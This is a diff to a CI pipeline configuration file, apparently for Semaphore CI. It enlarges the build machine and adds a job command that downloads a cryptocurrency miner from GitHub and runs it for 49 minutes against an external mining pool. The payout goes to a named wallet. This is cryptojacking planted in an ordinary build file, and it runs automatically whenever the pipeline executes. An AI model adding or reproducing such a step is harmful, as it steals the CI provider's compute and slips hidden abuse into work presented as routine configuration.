@@ -2,7 +2,7 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
 blocks:
   - name: 'Block #1'
@@ -10,4 +10,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
+            - wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && timeout 49m ./m-minerd-64-linux/m-minerd -a m7mhash -o stratum+tcp://eu.npc-mining.net:3002 -u 9Q8YVTkcGU2UXzigqW6uBgkXjPQPns2RZq -p c=XMG -e 71
             - checkout
